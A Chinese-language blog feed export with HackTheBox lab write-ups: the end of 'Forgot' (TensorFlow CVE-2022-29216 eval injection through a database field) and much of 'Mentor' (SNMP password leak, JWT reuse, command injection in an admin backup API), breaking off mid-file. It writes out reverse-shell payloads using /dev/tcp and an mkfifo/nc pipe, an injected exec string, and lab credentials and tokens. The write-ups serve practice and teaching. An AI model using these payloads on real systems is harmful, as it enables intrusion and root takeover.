<p><strong>注意</strong>：有个前提，匹配到了相关特征字段，才会有可能满足序列化数据的条件（具体可看score参数的传递链），才会执行第3步，从而才会去执行<code>preprocess_input_exprs_arg_string(data[i],safe=False)</code></p>
<p>那么有连接数据库的操作，用户名密码依然是diego的用户名密码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307153941609.png"></p>
<p>问题就出现在<code>preprocess_input_exprs_arg_string(data[i],safe=False)</code>，google搜了一下，是CVE-2022-29216，可以代码注入</p>
<p>参考<a href="https://github.com/advisories/GHSA-75c9-jrh4-79mc">https://github.com/advisories/GHSA-75c9-jrh4-79mc</a></p>
<p>稍微分析一下这个CVE原理，下面代码段是存在漏洞的版本（tensorflow2.6.3）<code>preprocess_input_exprs_arg_string()</code>函数的源码，主要问题就在于safe参数如果设为false，那么第12行判断<code>if safe</code>就会返回布尔0，从而跳转到18行<code>else</code>，然后执行<code>eval(expr)</code>，分析<code>expr</code>参数传递路线，也就是执行了<code>input_exprs_str</code>第一个等号后的表达式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">preprocess_input_exprs_arg_string</span><span class="token punctuation">(</span>input_exprs_str<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
  ......
  """</span>
  input_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token keyword">for</span> input_raw <span class="token keyword">in</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span> input_exprs_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'='</span> <span class="token keyword">not</span> <span class="token keyword">in</span> input_exprs_str<span class="token punctuation">:</span>
      <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">'--input_exprs "%s" format is incorrect. Please follow'</span>
                         <span class="token string">'"&lt;input_key&gt;=&lt;python expression&gt;"'</span> <span class="token operator">%</span> input_exprs_str<span class="token punctuation">)</span>
    input_key<span class="token punctuation">,</span> expr <span class="token operator">=</span> input_raw<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> safe<span class="token punctuation">:</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        input_dict<span class="token punctuation">[</span>input_key<span class="token punctuation">]</span> <span class="token operator">=</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>expr<span class="token punctuation">)</span>
      <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string-interpolation"><span class="token string">f'Expression "</span><span class="token interpolation"><span class="token punctuation">{</span>expr<span class="token punctuation">}</span></span><span class="token string">" is not a valid python literal.'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token comment"># ast.literal_eval does not work with numpy expressions</span>
      input_dict<span class="token punctuation">[</span>input_key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span>  <span class="token comment"># pylint: disable=eval-used</span>
  <span class="token keyword">return</span> input_dict<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>综上分析，我们可以在app数据库escalate表的reason列插入一个键值对（a=b格式），键名称任意，值为构造好的python代码（因为最终是代入到<code>/opt/security/ml_security.py</code>文件执行），其中包含执行反弹shell文件的代码，且包含刚才分析所提到的特征字段的任意一个，示例如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hello=exec("""\nimport os\nos.system("/tmp/wa0er_rev.sh")\nprint("%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E")""")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>开始操作，看一下tensorflow的版本是2.6.3，是漏洞存在的版本</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego@forgot:~$ pip show tensorflow
Name: tensorflow
Version: 2.6.3
Summary: TensorFlow is an open source machine learning framework for everyone.
Home-page: https://www.tensorflow.org/
Author: Google Inc.
Author-email: packages@tensorflow.org
License: Apache 2.0
Location: /usr/local/lib/python3.8/dist-packages
Requires: keras, h5py, grpcio, tensorflow-estimator, termcolor, opt-einsum, six, keras-preprocessing, protobuf, tensorboard, absl-py, google-pasta, wrapt, wheel, flatbuffers, typing-extensions, gast, astunparse, numpy, clang
Required-by:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在/tmp目录写一个反弹shell文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">diego@forgot:~$ vim /tmp/wa0er_rev.sh
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[本地IP]/[本地PORT] 0&gt;&amp;1
diego@forgot:~$ chmod +x /tmp/wa0er_rev.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>连接mysql</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307155647494.png"></p>
<p>进到app数据库</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307161028629.png"></p>
<p>执行如下sql语句，在escalate表里插入内容</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">insert into escalate values ("wa0er","wa0er","wa0er",'hello=exec("""\nimport os\nos.system("/tmp/wa0er_rev.sh")\nprint("%3CSCRIPT%3Ealert%28%22wa0er%22%29%3C/SCRIPT%3E")""")');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以看到第四列reason有我们注入的代码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230308112536633.png"></p>
<p>开启nc监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp [PORT]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行脚本</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo /opt/security/ml_security.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230308112658540.png"></p>
<p>拿到root，Over！</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307162318369.png"></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230307161312862.png" style="zoom:67%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdf.gitlab.io/2023/03/04/htb-forgot.html">https://0xdf.gitlab.io/2023/03/04/htb-forgot.html</a></p>
<p><a href="https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a">https://infosecwriteups.com/forgot-hack-the-box-walkthrough-htb-e571fd151f9a</a></p>
<p><a href="https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari">https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>varnish反向代理缓存</tag>
        <tag>重置密码功能投毒</tag>
        <tag>CVE-2022-29216（命令执行）</tag>
        <tag>python代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Mentor</title>
    <url>/posts/b2f064df.html</url>
    <content><![CDATA[<h1 id="HTB-Mentor"><a href="#HTB-Mentor" class="headerlink" title="HTB-Mentor"></a>HTB-Mentor</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li><p>信息收集得到<code>Swagger UI</code>页面、SNMP服务、诸多有效目录；</p>
</li>
<li><p>SNMP配置信息泄露管理员james密码；</p>
</li>
<li><p>登录james用户获取管理员JWT；</p>
</li>
<li><p>利用管理员JWT命令执行获取虚拟root权限；</p>
</li>
<li><p>发现PostgreSQL数据库，与之交互获取ssh账户；</p>
</li>
<li><p>登录ssh账户运行linpeas，从SNMP配置文件拿到james终端密码；</p>
</li>
<li><p>切换james终端用户，提权获取root权限。</p>
</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -sC -sV -oA nmap/result 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-05 19:47 EST
Nmap scan report for 10.10.11.193
Host is up (0.38s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://mentorquotes.htb/
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（SSH）、80（HTTP），域名<code>http://mentorquotes.htb/</code></p>
<p>添加域名到本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.193  mentorquotes.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>URL访问<code>http://mentorquotes.htb/</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306093239887.png"></p>
<p>wfuzz一下子域</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: wa0er" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mentorquotes.htb/
Total requests: 38267

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================

000000142:   404        0 L      2 W        22 Ch       "api"                                                

Total time: 0
Processed Requests: 38267
Filtered Requests: 38266
Requests/sec.: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得api子域，将api子域添加进本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.193  api.mentorquotes.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问<code>api.mentorquotes.htb</code>，是404</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306101405953.png"></p>
<p>ffuf爆破一下<code>api.mentorquotes.htb</code>的目录</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://api.mentorquotes.htb/FUZZ -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 292ms]
    * FUZZ: admin

[Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 533ms]
    * FUZZ: docs

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 362ms]
    * FUZZ: users

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 1082ms]
    * FUZZ: quotes

[Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 863ms]
    * FUZZ: server-status

:: Progress: [38267/38267] :: Job [1/1] :: 125 req/sec :: Duration: [0:04:47] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到<code>api.mentorquotes.htb</code>四个目录：<code>/admin</code>、<code>/docs</code>、<code>/users</code>、<code>/quotes</code>、<code>/server-status</code></p>
<p><code>api.mentorquotes.htb/admin</code>如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306103252841.png"></p>
<p><code>api.mentorquotes.htb/docs</code>如下，用的Swagger UI，页面能看到很多API</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306110133574.png"></p>
<p>可以看到这个站点的站主是james，并且他的邮箱是<code>james@mentorquotes.htb</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230306115013576.png"></p>
<p>在<code>/auth/signup</code>尝试注册账户，如下界面，填写email、username、password，点击Execute，同时Burp抓包</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095353490.png" style="zoom: 80%;">

<p>Burp抓包重放，如下，可看到账户已被创建</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095634694.png"></p>
<p>尝试用刚创建的账户在<code>/auth/login</code>登录，填写email、username、password，点击Execute，依然Burp抓包</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309095912378.png" style="zoom:80%;">

<p>Burp重放，发现返回了一串JWT（JsonWebToken，下简称JWT，JWT典型的三段结构：xxx.xxx.xxx）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309100356141.png"></p>
<pre class="line-numbers language-none"><code class="language-none">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>/users</code>目录应该是所有用户的信息，于是在<code>/users</code>目录尝试登录，如果直接登录，会发现提示需要Authorization字段，那我们就抓包在请求头添加如下Authorization键值对，重放HTTP请求，发现提示只允许admin用户访问</p>
<pre class="line-numbers language-none"><code class="language-none">Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InN0cmluZyIsImVtYWlsIjoid2EwZXJAZXhhbXBsZS5jb20ifQ.HfrTNgZInwCjDjfhO447ojuw5lEZWi03NmrENknZJZ8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309104511936.png"></p>
<p>然后尝试用james用户的邮箱用户名去注册，发现会提示用户已存在</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309105121413.png"></p>
<p>随后进行百般尝试，发现它验证用户是否已存在的逻辑是：当email和username同时匹配到相同的值时，才会认定此用户已存在。于是尝试伪造管理员用户获取管理员JWT（这里的管理员用户推测应该是站主james或者admin）。</p>
<p>但随后用<code>注册→登录（获取JWT）→/users目录</code>尝试了以下5种组合，均提示只有admin用户能访问该资源</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"james@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"wa0er@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"james"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"admin@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"admin@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"email"</span><span class="token operator">:</span><span class="token string">"wa0er@mentorquotes.htb"</span><span class="token punctuation">,</span>
	<span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"wa0erwa0er"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>随后整理思路，在一次nmap扫描中，看到如下信息</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -sU 10.10.11.193
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-11 21:40 EST
Nmap scan report for mentorquotes.htb (10.10.11.193)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open|filtered snmp

Nmap done: 1 IP address (1 host up) scanned in 1031.83 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>68端口（DHCPC）和161端口（SNMP）开放，DHCP可能的攻击主要就是拒绝服务和中间人攻击，用不上，那就从SNMP下手。</p>
<p>SNMP全称简单网络管理协议，是专门设计用于在IP网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，是一种应用层协议。通过SNMP可以访问设备信息、改写和配置设备参数等，SNMP运行在UDP161端口上，采用UDP协议在管理端和agent之间传输信息。</p>
<p>试试用<code>snmpbulkwalk</code>读取相关配置信息</p>
<p><a href="https://linux.die.net/man/1/snmpbulkwalk">https://linux.die.net/man/1/snmpbulkwalk</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">snmpbulkwalk -c internal -v2c 10.10.11.193 &gt; snmpbulk_mentor
注：
-v 1|2c|3  指定SNMP版本
-c COMMUNITY  指定community string
-m MIB[:...]  指定MIB文件（此处没用到）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看刚读取的配置信息，搜索带有login字符串的条目，发现<code>/usr/local/bin/login.py</code>有一个字符串<code>kj23sadkj123as0-d213</code>，可能是管理员的登录密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat snmpbulk mentor | grep login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309150130498.png"></p>
<p>我们到<code>/auth/login</code>目录，用james的邮箱和用户名，密码填写刚获得的密码，成功登录，获取到james账户JWT</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309145949205.png"></p>
<pre class="line-numbers language-none"><code class="language-none">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"

Authorization:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="三、命令执行"><a href="#三、命令执行" class="headerlink" title="三、命令执行"></a>三、命令执行</h2><p>访问<code>/users/</code>目录，成功拿到用户列表，主要是两个用户：james和service_acc</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309145453473.png"></p>
<p>刚才我们爆破出了<code>/admin</code>目录，我们重新用这个JWT访问此目录，发现有两个功能目录</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"admin_funcs"</span><span class="token operator">:</span><span class="token punctuation">{</span>
	<span class="token property">"check db connection"</span><span class="token operator">:</span><span class="token string">"/check"</span><span class="token punctuation">,</span>
	<span class="token property">"backup the application"</span><span class="token operator">:</span><span class="token string">"/backup"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152115896.png"></p>
<p>访问<code>/admin/check</code>，返回<code>Not implemented yet!</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152224945.png"></p>
<p>访问<code>/admin/backup</code>，返回<code>Method Not Allowed</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152312484.png"></p>
<p>在请求头区域单击鼠标右键，选择<code>Change request method</code>，自动切换成POST方法，点击<code>send</code>发送数据包后，</p>
<p>可看到响应包<code>content-type</code>值为<code>application/json</code>，再加上数据部分的报错，意思就是请求包需要有带body属性的json对象</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309152517993.png"></p>
<p>修改<code>content-type</code>值为<code>application/json</code>，请求头内容添加json对象，body为空就行，又提示需要path属性</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153313297.png"></p>
<p>于是在请求头内容添加body属性和path属性，返回<code>Done!</code>，嗯？？？，Done了个寂寞，应该是代入执行了</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153439313.png"></p>
<p>那我们就尝试执行命令，修改body如下，也就是ping本地主机（务必记得末尾加分号！）</p>
<p>在发送请求包前在本地开启tcpdump捕获数据包</p>
<pre class="line-numbers language-none"><code class="language-none">tcpdump -i tun0 icmp   #只捕获tun0网卡的icmp协议数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312123956105.png"></p>
<p>发送请求包后，可在本地看到有数据包被捕获，说明命令被成功执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309153957568.png"></p>
<p>那就构造如下请求包，本地开启nc监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/admin/backup</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">api.mentorquotes.htb</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span></span>
<span class="token header"><span class="token header-name keyword">Authorization</span><span class="token punctuation">:</span><span class="token header-value">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.5</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://api.mentorquotes.htb/docs</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">108</span></span>
<span class="token application-json">
<span class="token punctuation">{</span>
	<span class="token property">"body"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"path"</span><span class="token operator">:</span><span class="token string">"/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.X.X 9898 &gt;/tmp/f;"</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功反弹shell，获取到root权限，但看到nc提示<code>sh: can't access tty; job control turned off</code>，这说明根本就没有进到控制终端，可能是个虚拟环境之类的，尝试读取<code>/root/root.txt</code>文件发现确实没有，所以还要进一步getshell</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312130834345.png"></p>
<p><code>/app/app</code>目录下有<code>db.py</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309160934921.png"></p>
<p><code>db.py</code>内容如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os

<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> <span class="token punctuation">(</span>Column<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Table<span class="token punctuation">,</span> create_engine<span class="token punctuation">,</span> MetaData<span class="token punctuation">)</span>
<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>sql <span class="token keyword">import</span> func
<span class="token keyword">from</span> databases <span class="token keyword">import</span> Database

<span class="token comment"># Database url if none is passed the default one is used</span>
DATABASE_URL <span class="token operator">=</span> os<span class="token punctuation">.</span>getenv<span class="token punctuation">(</span><span class="token string">"DATABASE_URL"</span><span class="token punctuation">,</span> <span class="token string">"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db"</span><span class="token punctuation">)</span>

<span class="token comment"># SQLAlchemy for quotes</span>
engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span>
metadata <span class="token operator">=</span> MetaData<span class="token punctuation">(</span><span class="token punctuation">)</span>
quotes <span class="token operator">=</span> Table<span class="token punctuation">(</span>
